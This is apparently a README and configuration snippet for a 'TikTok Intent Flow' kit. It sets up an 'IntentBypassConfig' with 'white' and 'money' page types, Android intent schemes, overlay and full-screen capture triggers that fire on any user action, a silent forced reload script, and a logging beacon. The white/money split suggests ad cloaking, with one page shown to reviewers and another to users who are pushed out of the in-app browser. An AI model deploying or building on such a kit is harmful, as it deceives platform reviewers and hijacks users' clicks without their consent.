TikTok Intent Flow
==================
### `refresher.js`
- Used **only** on the white page to force a single reload per tab session.
- Stores a `__intentRefreshSession` flag in `sessionStorage`. If absent, it sets the flag, appends `_r=<timestamp>` to the URL, and reloads—busting preloaded snapshots. Subsequent visits in the same tab do nothing.
- No configs, no intent logic; it silently executes once.

Configuration for `Index.php` Put it in <head> tag
-------------

<!-- UAParser --> 
<script src="/ua-parser.min.js"></script>

<!-- Intent Logger -->
<script src="/intent-logger.js"></script>

<!-- Intent Config -->
<script>
window.IntentBypassConfig = {

  /* Required */
  intentTarget: "https://example.com/",

  /* Page type: "white" | "money" (default: white) */
  pageType: "white",

  /* Intent scheme: minimal | fallback | view_browsable | dispatcher */
  intentScheme: "minimal",

  /* Open method: blank | self | href | replace | anchor | two_step | overlay */
  openMethod: "blank",

  /* Money triggers */
  intentSelectors: [],       // array of CSS selectors. If empty - any action will trigger intent
  fullscreenTrigger: true,   // enable full-screen capture

  /* Auto attempt */
  autoAttemptOnLoad: false,

  /* Analytics */
  beaconEndpoint: "https://your-server.com/intent-log.php",
  variant: "flowA",
  debug: false,
  captureLogs: false
};
</script>

<!-- Main script -->
<script src="/main.js"></script>